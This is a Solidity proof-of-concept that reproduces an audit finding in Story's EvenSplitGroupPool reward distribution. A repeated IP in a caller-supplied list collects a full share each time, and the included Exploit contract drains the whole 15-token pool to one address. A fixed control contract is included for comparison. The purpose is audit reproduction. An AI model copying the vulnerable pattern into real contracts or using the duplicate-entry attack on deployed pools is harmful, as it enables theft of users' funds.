// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Story EvenSplitGroupPool.distributeRewards (Halborn).
    A group of 3 shares a 15 token pool, 5 each. claimReward is called
    with the same ip three times. Shares are computed before reward debt
    moves, so that ip is paid 5 three times and takes the whole 15.
    The control writes debt inside the loop and pays 5 once.
*/

contract Token {
    string public symbol = "ROYAL";
    uint8 public constant decimals = 18;
    mapping(address => uint256) internal _bal;

    function balanceOf(address account) public view returns (uint256) {
        return _bal[account];
    }

    function mint(address to, uint256 amt) external {
        _bal[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _bal[msg.sender] -= amt;
        _bal[to] += amt;
        return true;
    }
}

contract EvenSplitGroupPool {
    Token public token;
    uint256 public totalIps;
    uint256 public poolBalance;
    mapping(address => uint256) public rewardDebt;
    uint256 public rewardPerIpStored;
    uint256 public totalRewards;
    uint256 public totalPaid;
    address public paidIp;
    uint256 public paidEach;
    uint256 public transfers;

    constructor(Token _token) {
        token = _token;
        totalIps = 3;
        poolBalance = 15 ether;
        token.mint(address(this), 15 ether);
    }

    // Quoted distributeRewards. The debt write is after every share is known.
    function distributeRewards(address[] calldata ipIds) external returns (uint256[] memory rewards) {
        rewards = _available(ipIds);
        uint256 sum = 0;
        for (uint256 i = 0; i < ipIds.length; i++) {
            sum += rewards[i];
        }
        totalRewards = sum;
        if (sum == 0) return rewards;
        for (uint256 i = 0; i < ipIds.length; i++) {
            if (rewards[i] == 0) continue;
            rewardDebt[ipIds[i]] += rewards[i];
            token.transfer(ipIds[i], rewards[i]); // @> VULN: a repeated ip was allotted a full share before debt moved
            paidIp = ipIds[i];
            paidEach = rewards[i];
            totalPaid += rewards[i];
            transfers += 1;
        }
    }

    // Quoted _getAvailableReward. Debt is still the old value for every entry.
    function _available(address[] memory ipIds) internal returns (uint256[] memory rewards) {
        rewards = new uint256[](ipIds.length);
        uint256 per = poolBalance / totalIps;
        rewardPerIpStored = per;
        for (uint256 i = 0; i < ipIds.length; i++) {
            rewards[i] = per - rewardDebt[ipIds[i]];
        }
    }
}

contract EvenSplitGroupPoolFixed {
    Token public token;
    uint256 public totalIps;
    uint256 public poolBalance;
    mapping(address => uint256) public rewardDebt;
    uint256 public totalPaid;

    constructor(Token _token) {
        token = _token;
        totalIps = 3;
        poolBalance = 15 ether;
        token.mint(address(this), 15 ether);
    }

    function distributeRewards(address[] calldata ipIds) external returns (uint256 paid) {
        uint256 per = poolBalance / totalIps;
        for (uint256 i = 0; i < ipIds.length; i++) {
            uint256 reward = per - rewardDebt[ipIds[i]];
            if (reward == 0) continue;
            rewardDebt[ipIds[i]] += reward;
            token.transfer(ipIds[i], reward);
            paid += reward;
        }
        totalPaid = paid;
    }
}

contract GroupingModule {
    EvenSplitGroupPool public pool;
    uint256 public claimed;

    constructor(EvenSplitGroupPool _pool) {
        pool = _pool;
    }

    // Quoted claimReward. The caller picks the ip list.
    function claimReward(address[] calldata ipIds) external returns (uint256[] memory rewards) {
        rewards = pool.distributeRewards(ipIds);
        claimed = ipIds.length;
    }
}

contract Exploit {
    address public constant ALICE = 0x1111111111111111111111111111111111111111;

    Token public token;
    EvenSplitGroupPool public pool;
    GroupingModule public module;

    function run() external {
        token = new Token();
        pool = new EvenSplitGroupPool(token);
        module = new GroupingModule(pool);
        address[] memory ids = new address[](3);
        ids[0] = ALICE;
        ids[1] = ALICE;
        ids[2] = ALICE;
        module.claimReward(ids);
        require(token.balanceOf(ALICE) == 15 ether, "one ip took 15");
        require(pool.totalPaid() == 15 ether, "paid 15");
        require(token.balanceOf(address(pool)) == 0, "pool empty");
        require(module.claimed() == 3, "three entries");
    }
}
